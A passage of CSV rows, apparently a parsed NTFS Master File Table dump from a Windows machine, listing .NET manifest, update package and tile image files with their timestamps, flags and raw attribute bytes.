00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00'}",,,,
86795,Valid,In Use,File,2,14935,0,x86_netfx4-clr_dll_b03f5f7f11d50a3a_4.0.15713.205_none_7df1725c7fbadb90.maifest,,2019-03-19T10:55:22.337Z,2019-03-19T10:55:22.024Z,2019-03-19T11:00:23.257Z,2019-03-19T10:55:22.337Z,2019-03-19T10:55:22.024Z,2019-03-19T10:55:22.024Z,2019-03-19T10:55:22.024Z,2019-03-19T10:55:22.024Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,True,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x001\x01\x13\xa30\x00\x00\x00\x00\x01\x00\x00(\x00\x00\x00\x00\x04\x18\x00\x00\x00\x04\x00\x08\x00\x00\x00 \x00\x00\x00$\x00D\x00S\x00C\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00'}",,,,
86814,Valid,In Use,File,2,14935,0,msil_system.design_b03f5f7f11d50a3a_10.0.17763.205_none_8ddbe5575e1a897a.mnifest,,2019-03-19T10:55:22.367Z,2019-03-19T10:55:22.166Z,2025-11-24T12:29:20.944Z,2019-03-19T10:55:22.367Z,2019-03-19T10:55:22.166Z,2019-03-19T10:55:22.166Z,2019-03-19T10:55:22.166Z,2019-03-19T10:55:22.166Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,True,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x001\x01*\xa30\x00\x00\x00\x00\x01\x00\x00(\x00\x00\x00\x00\x04\x18\x00\x00\x00\x04\x00\x08\x00\x00\x00 \x00\x00\x00$\x00D\x00S\x00C\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00'}",,,,
86835,Valid,In Use,File,2,86388,1,GlobalSerif.CompositeFont,,Not defined,Not defined,Not defined,Not defined,2018-09-15T07:29:58.717Z,Invalid timestamp,2018-09-15T07:29:58.717Z,2019-03-19T10:54:58.211Z,,,,,False,False,True,False,False,True,False,False,False,False,False,False,True,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 7}",None,None,None,None,None,None,"{'size': 19703626332373028, 'data': b'_\x00D\x00A\x00T\x00A\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x05\x00\x01\x00\x00\x00\x01\x00\x00\x00a\x01\x00\x00\x00\x00\x00\x00\x01\x02*\x00\x00\x00\x00\x00\x1f<\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x0e\x01\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00'}",,,,
86851,Valid,In Use,Directory,3,5565,0,x86_netfx4-globalmonospacecf_b03f5f7f11d50a3a_4.0.15713.205_none_fd0b07c26
                                                                                                                274745,,2019-03-19T10:55:22.367Z,2019-03-19T10:55:22.367Z,2025-11-24T13:36:59.370Z,2019-03-19T10:55:22.367Z,2019-03-19T10:55:22.367Z,2019-03-19T10:55:22.367Z,2019-03-19T10:55:22.367Z,2019-03-19T10:55:22.367Z,,,,,True,False,True,False,False,False,True,False,False,False,False,False,True,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00'}",,,,
a15eebe",,2019-03-19T10:55:22.367Z,2019-03-19T10:55:22.367Z,2025-11-24T13:36:54.325Z,2019-03-19T10:55:22.367Z,2019-03-19T10:55:22.367Z,2019-03-19T10:55:22.367Z,2019-03-19T10:55:22.367Z,2019-03-19T10:55:22.367Z,,,,,True,False,True,False,False,False,True,False,False,False,False,False,True,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\x00'}",,,,
87d88",,2019-03-19T10:55:22.367Z,2019-03-19T10:55:22.367Z,2025-11-24T13:36:59.370Z,2019-03-19T10:55:22.367Z,2019-03-19T10:55:22.367Z,2019-03-19T10:55:22.367Z,2019-03-19T10:55:22.367Z,2019-03-19T10:55:22.367Z,,,,,True,False,True,False,False,False,True,False,False,False,False,False,True,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\x00'}",,,,
86857,Valid,In Use,File,17,14932,0,$$_microsoft.net_framework_v4.0.30319_wpf_bc1339ef8efa3c4c.cdf-ms,,2018-09-15T07:31:34.444Z,2019-03-19T10:55:29.992Z,2019-03-19T10:55:29.992Z,2019-03-19T10:58:21.837Z,2019-03-19T10:55:29.992Z,2019-03-19T10:55:29.992Z,2019-03-19T10:55:29.992Z,2019-03-19T10:55:29.992Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,True,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 1}",None,None,None,None,None,None,"{'size': 19703626332373028, 'data': b'_\x00D\x00A\x00T\x00A\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x05\x00\x01\x00\x00\x00\x01\x00\x00\x00\xa8\x02\x00\x00\x00\x00\x00\x00\x01\x02*\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00}\x02\x00\x00\xff\xff\xff\xff\x82yG\x11\x05\x00\x00\x00\x00\x00\x05\x00\x01\x00\x00\x00\x01\x00\x00\x00\xa8\x02\x00\x00\x00\x00\x00\x00\x00\xaa""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00'}",,,,
86858,Valid,In Use,File,2,14932,0,$$_microsoft.net_framework_v4.0.30319_wpf_en-us_dc5fd125966afabc.cdf-ms,,2018-09-15T07:31:34.444Z,2019-03-19T10:55:29.992Z,2019-03-19T10:55:29.992Z,2019-03-19T10:58:21.837Z,2019-03-19T10:55:29.992Z,2019-03-19T10:55:29.992Z,2019-03-19T10:55:29.992Z,2019-03-19T10:55:29.992Z,,,,,True,False,True,False,False,False,False,False,False,False,False,False,False,[],None,,None,None,None,None,None,None,None,None,None,,,,
86859,Valid,In Use,File,2,14932,0,$$_microsoft.net_framework_v4.0.30319_nativeimages_7f83bd6ed8241f3a.cdf-ms,,2018-09-15T07:31:34.444Z,2019-03-19T10:55:29.992Z,2019-03-19T10:55:29.992Z,2019-03-19T10:58:21.837Z,2019-03-19T10:55:29.992Z,2019-03-19T10:55:29.992Z,2019-03-19T10:55:29.992Z,2019-03-19T10:55:29.992Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,True,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,"{'size': 19703626332373028, 'data': b'_\x00D\x00A\x00T\x00A\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x05\x00\x01\x00\x00\x00\x01\x00\x00\x00\xaa\x02\x00\x00\x00\x00\x00\x00\x01\x02*\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x89\x02\x00\x00\xff\xff\xff\xff\x82yG\x11\x05\x00\x00\x00\x00\x00\x05\x00\x01\x00\x00\x00\x01\x00\x00\x00\xaa\x02\x00\x00\x00\x00\x00\x00\x00\xde""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00'}",,,,
86867,Valid,In Use,File,3,82493,0,LargeTile.scale-125.png,,2025-11-24T10:58:20.010Z,2025-11-24T10:59:59.557Z,2025-11-24T11:56:10.739Z,2025-11-24T11:56:28.046Z,2025-11-24T10:58:20.010Z,2025-11-24T10:58:20.010Z,2025-11-24T10:58:20.010Z,2025-11-24T10:58:20.010Z,,,,,True,False,True,False,False,True,False,False,False,False,True,True,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,"{'ea_size': 111, 'ea_count': 262268}","{'next_entry_offset': 64, 'flags': 0, 'name': '$KERNEL.PURGE.ESBCACHE', 'value': b'\x00\x1e\x00\x00\x00\x03\x00\x02\x06\xc6\xbd\x97\xb1\x83\xde\xd4\x01\x80fB\xa5ps\xd3\x01\x02\x00\x00\x00\x00'}",None,,,,
86868,Valid,In Use,File,3,82493,0,LargeTile.scale-150.png,,2025-11-24T10:58:20.010Z,2025-11-24T10:59:59.557Z,2025-11-24T11:56:10.739Z,2025-11-24T11:56:28.046Z,2025-11-24T10:58:20.010Z,2025-11-24T10:58:20.010Z,2025-11-24T10:58:20.010Z,2025-11-24T10:58:20.010Z,,,,,True,False,True,False,False,True,False,False,False,False,True,True,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,"{'ea_size': 111, 'ea_count': 393340}","{'next_entry_offset': 64, 'flags': 0, 'name': '$KERNEL.PURGE.ESBCACHE', 'value': b'\x00\x1e\x00\x00\x00\x03\x00\x02\x06\xc6\xbd\x97\xb1\x83\xde\xd4\x01\x80fB\xa5ps\xd3\x01\x02\x00\x00\x00\x00'}",None,,,,
86869,Valid,In Use,File,3,82493,0,LargeTile.scale-200.png,,2025-11-24T10:58:20.010Z,2025-11-24T10:59:59.557Z,2025-11-24T11:56:10.739Z,2025-11-24T11:56:28.046Z,2025-11-24T10:58:20.010Z,2025-11-24T10:58:20.010Z,2025-11-24T10:58:20.010Z,2025-11-24T10:58:20.010Z,,,,,True,False,True,False,False,True,False,False,False,False,True,True,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 1}",None,None,None,None,"{'ea_size': 111, 'ea_count': 393340}","{'next_entry_offset': 64, 'flags': 0, 'name': '$KERNEL.PURGE.ESBCACHE', 'value': b'\x00\x1e\x00\x00\x00\x03\x00\x02\x06\xc6\xbd\x97\xb1\x83\xde\xd4\x01\x80fB\xa5ps\xd3\x01\x02\x00\x00\x00\x00'}",None,,,,
86870,Valid,In Use,Directory,4,117498,0,f,,2019-03-19T11:21:13.154Z,2019-03-19T11:21:13.174Z,2025-11-24T13:37:13.287Z,2019-03-19T11:21:13.174Z,2019-03-19T11:21:13.154Z,2019-03-19T11:21:13.154Z,2019-03-19T11:21:13.154Z,2019-03-19T11:21:13.154Z,,,,,True,False,True,False,False,False,True,False,False,False,False,False,True,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00'}",,,,
86871,Valid,In Use,Directory,4,117498,0,r,,2019-03-19T11:21:13.174Z,2019-03-19T11:21:13.174Z,2025-11-24T13:37:13.287Z,2019-03-19T11:21:13.174Z,2019-03-19T11:21:13.174Z,2019-03-19T11:21:13.174Z,2019-03-19T11:21:13.174Z,2019-03-19T11:21:13.174Z,,,,,True,False,True,False,False,False,True,False,False,False,False,False,True,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00'}",,,,
86879,Valid,In Use,File,1,3491,0,Package_2_for_KB4486553~31bf3856ad364e35~amd64~~10.0.1.2353.mum,,2019-03-19T10:55:19.118Z,2019-01-08T23:32:08.631Z,2025-11-24T12:28:11.267Z,2019-03-19T10:55:24.211Z,2019-03-19T10:55:19.118Z,2019-01-08T23:32:08.631Z,2019-03-19T10:55:19.118Z,2019-03-19T10:55:18.337Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 5066549580791808, 'last_vcn': 15}",None,None,None,None,None,None,None,,,,
86881,Valid,In Use,File,1,3491,0,Package_3_for_KB4486553~31bf3856ad364e35~amd64~~10.0.1.2353.mum,,2019-03-19T10:55:19.180Z,2019-01-08T23:32:08.631Z,2025-11-24T12:28:11.273Z,2019-03-19T10:55:24.211Z,2019-03-19T10:55:19.180Z,2019-01-08T23:32:08.631Z,2019-03-19T10:55:19.180Z,2019-03-19T10:55:18.337Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 2814749767106560, 'last_vcn': 1}",None,None,None,None,None,None,None,,,,
86883,Valid,In Use,File,1,3491,0,Package_4_for_KB4486553~31bf3856ad364e35~amd64~~10.0.1.2353.mum,,2019-03-19T10:55:19.180Z,2019-01-08T23:32:08.631Z,2025-11-24T12:28:11.278Z,2019-03-19T10:55:24.227Z,2019-03-19T10:55:19.180Z,2019-01-08T23:32:08.631Z,2019-03-19T10:55:19.180Z,2019-03-19T10:55:18.320Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 2814749767106560, 'last_vcn': 0}",None,None,None,None,None,None,None,,,,
86884,Valid,In Use,File,1,3491,0,PAEEFD~1.CAT,,2019-03-19T10:55:19.180Z,2019-01-08T23:33:25.753Z,2025-11-24T10:37:53.048Z,2019-03-19T10:55:24.227Z,2019-03-19T10:55:19.180Z,2019-01-08T23:33:25.753Z,2019-03-19T10:55:24.227Z,2019-03-19T10:55:24.227Z,,,,,True,False,True,False,False,False,False,False,False,False,False,False,False,[],None,,None,None,None,None,None,None,None,None,None,,,,
